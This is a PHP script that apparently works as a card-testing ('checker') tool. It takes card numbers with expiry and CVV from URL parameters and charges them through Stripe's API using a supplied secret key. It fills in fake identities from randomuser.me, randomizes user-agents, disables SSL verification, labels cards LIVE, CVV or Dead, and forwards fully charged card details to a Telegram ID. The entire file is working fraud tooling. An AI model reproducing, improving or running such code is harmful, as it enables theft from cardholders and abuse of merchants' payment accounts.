  <?php
  require "./config.php";
  error_reporting(0);
  set_time_limit(0);
  error_reporting(0);
  date_default_timezone_set('America/Buenos_Aires');

  $amount = 1;
  $tgid = "123";
  $curr = "inr";
  $sk = "sk_live_xnxx";
  if (isset($_GET['skkey'])) {
    $sk = $_GET['skkey'];
  }
  if (isset($_GET['amount'])) {
    $amount = $_GET['amount'];
  }
  if (!empty($_GET['tgid'])) {
    $tgid = $_GET['tgid'];
  }

  if (!empty($_GET['curr'])) {
    $curr = $_GET['curr'];
  }

  $cur = "₹";
  if ($curr == "usd") {
    $cur = "$";
  }elseif($curr=="eur"){
    $cur ="€";
  }
  $amt = $amount === "min" ? 1 : $amount;
  $hyper = array(
    "currency" => $curr,
    "desc" => "hyper donation",
    "currency_symbol" => $cur,
    "amount" => $amount * 100,
    "country" => "India",
    "sk" => $sk
  );


  function multiexplode($delimiters, $string)
  {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
  }


  $lista = $_GET['lista'];
  $cc = multiexplode(array(":", " ", "|", ""), $lista)[0];
  $mes = multiexplode(array(":", " ", "|", ""), $lista)[1];
  $ano = multiexplode(array(":", " ", "|", ""), $lista)[2];
  $cvv = multiexplode(array(":", " ", "|", ""), $lista)[3];

  function GetStr($string, $start, $end)
  {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
  }

  function value($str, $find_start, $find_end)
  {
    $start = @strpos($str, $find_start);
    if ($start === false) {
      return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str, $start + $length), $find_end);
    return trim(substr($str, $start + $length, $end));
  }
  function mod($dividendo, $divisor)
  {
    return round($dividendo - (floor($dividendo / $divisor) * $divisor));
  }

  #########################[BIN LOOK-UP]############################

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/' . $cc . '');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: lookup.binlist.net',
    'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
  ));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, '');
  $fim = curl_exec($ch);
  $emoji = GetStr($fim, '"emoji":"', '"');
  if (strpos($fim, '"type":"credit"') !== false) {
  }
  curl_close($ch);

  #########################

  $ch = curl_init();
  $bin = substr($cc, 0, 6);
  curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  $bindata = curl_exec($ch);
  $binna = json_decode($bindata, true);
  $brand = $binna['scheme'];
  $country = $binna['country']['name'];
  $type = $binna['type'];
  $bank = $binna['bank']['name'];
  curl_close($ch);

  $bindata1 = " $type - $brand - $country $emoji"; 

  $get = file_get_contents('https://randomuser.me/api/1.3/?nat=' . $country . '');
  preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
  $first = $matches1[1][0];
  preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
  $last = $matches1[1][0];
  preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
  $email = $matches1[1][0];
  $serve_arr = array("gmail.com", "homtail.com", "yahoo.com.br", "outlook.com");
  $serv_rnd = $serve_arr[array_rand($serve_arr)];
  $email = str_replace("example.com", $serv_rnd, $email);
  preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
  $street = $matches1[1][0];
  preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
  $city = $matches1[1][0];
  preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
  $state = $matches1[1][0];
  preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
  $phone = $matches1[1][0];
  preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
  $postcode = $matches1[1][0];
  preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
  $zip = $matches1[1][0];



  # ------------ 1st Req

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]=' . $cc . '&card[cvc]=' . $cvv . '&card[exp_month]=' . $mes . '&card[exp_year]=' . $ano . '&&billing_details[name]=' . $firstname . '&billing_details[email]=' . $email . '');

  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Authorization: Bearer ' . $sk . '',
    'user-agent: Mozilla/5.0 (Windows NT ' . rand(11, 99) . '.0; Win64; x64) AppleWebKit/' . rand(111, 999) . '.' . rand(11, 99) . ' (KHTML, like Gecko) Chrome/' . rand(11, 99) . '.0.' . rand(1111, 9999) . '.' . rand(111, 999) . ' Safari/' . rand(111, 999) . '.' . rand(11, 99) . ''
  ));

  $r1 = curl_exec($ch);
  $tok = trim(strip_tags(getstr($r1, '"id": "', '"')));
  $d_code1 = trim(strip_tags(getStr($r1, '"decline_code": "', '"')));

  # ---------- 2nd Req

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=' . $tok . '&description=' . $hyper['desc'] . '&confirm=true&amount=' . $hyper['amount'] . '&currency='.$hyper['currency'].'&off_session=true');

  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Authorization: Bearer ' . $sk . '',
    'user-agent: Mozilla/5.0 (Windows NT ' . rand(11, 99) . '.0; Win64; x64) AppleWebKit/' . rand(111, 999) . '.' . rand(11, 99) . ' (KHTML, like Gecko) Chrome/' . rand(11, 99) . '.0.' . rand(1111, 9999) . '.' . rand(111, 999) . ' Safari/' . rand(111, 999) . '.' . rand(11, 99) . ''
  ));

  $r2 = curl_exec($ch);
  $charge = trim(strip_tags(getstr($r2, '"id": "', '"')));
  $check3 = trim(strip_tags(getStr($r2, '"cvc_check": "', '"')));
  $msg3 = trim(strip_tags(getStr($r2, '"message": "', '"')));
  $d_code3 = trim(strip_tags(getStr($r2, '"decline_code": "', '"')));
  $receipturl = trim(strip_tags(getStr($r2, '"receipt_url": "', '"')));
  $networkstatus = trim(strip_tags(getStr($r2, '"network_status": "', '"')));
  $risklevel = trim(strip_tags(getStr($r2, '"risk_level": "', '"')));
  $seller_message = trim(strip_tags(getStr($r2, '"seller_message": "', '"')));


function decline_reason($re1, $re2)
{
  $decline1 = trim(strip_tags(getStr($re1, '"decline_code": "', '"')));
  $decline2 = trim(strip_tags(getStr($re2, '"decline_code": "', '"')));
  $msg1 =  trim(strip_tags(getStr($re1, '"message": "', '"')));
  $msg2 =  trim(strip_tags(getStr($re2, '"message": "', '"')));

  if (!empty($decline1)) {
    return $decline1 . ": " . $msg1;
  } else if (!empty($decline2)) {
    return $decline2 . ": " . $msg2;
  } else {
    return "NULL";
  }
}

  if (strpos($r2, '"seller_message": "Payment complete."')) {
    $status = '#LIVE';
    $cc_code = $cur . $amt . ' Charged. ';
    send_message($tgid, "✅ 𝗟𝗶𝘃𝗲 𝗖𝗵𝗮𝗿𝗴𝗲𝗱\n𝗖𝗖 ➔ $lista\n𝗠𝗦𝗚 ➔ $cc_code\n𝗥𝗘𝗖𝗘𝗜𝗣𝗧 ➔ HIDDEN\n𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➔$country");
    echo "<p class='hyperline' >".$status . ' | <a class="receipt" target="_blank" href="' . $receipturl . '"> '.$cc_code.'</a>  | ' . $lista . ' | ' . $country . ' </p>';
    exit;
  } elseif ((strpos($r2, 'insufficient_funds')) || (strpos($r1, 'insufficient_funds'))) {
    $status = '#CVV';
    $cc_code = 'Insufficient';
    // send_message($tgid, "cc=> $lista\nMessage=> $cc_code");
  } elseif (strpos($r1, "incorrect_cvc") || strpos($r2, "incorrect_cvc")) {
    $status = '#CCN';
    $cc_code = 'incorrect_cvc';
    // send_message($tgid, "cc=> $lista\nMessage=> $cc_code");
  } elseif (strpos($r1, 'test_mode_live_card')) {
    $status = 'Dead';
    $cc_code = 'Test Mode Charges';
  } elseif (strpos($r1, 'testmode_charges_only')) {
    $status = 'Dead';
    $cc_code = 'Teast Mode Charges';
  } elseif (strpos($r1, "rate_limit")) {
    $status = 'Dead';
    $cc_code = 'Rate Limit';
  } elseif (strpos($r1, "Sending credit card numbers directly to the Stripe API is generally unsafe")) {
    $status = 'Dead';
    $cc_code = 'SK KEY DEAD';
  } elseif (strpos($r1, "api_key_expired")) {
    $status = 'Dead';
    $cc_code = 'API Expired';
  }elseif (strpos($r1, "invalid_request_error")) {
    $status = 'SK KEY';
    $cc_code = 'Invalid Key';
  } else {
    $status = 'Declined';
    $cc_code = 'DEAD';
  }
  
  echo '<p class="hyperline">' . $status . ' | ' . $cc_code . ' | ' . $lista . ' | ' . decline_reason($r1, $r2) .  ' <p>';


  curl_close($ch);
  ob_flush();

  ?>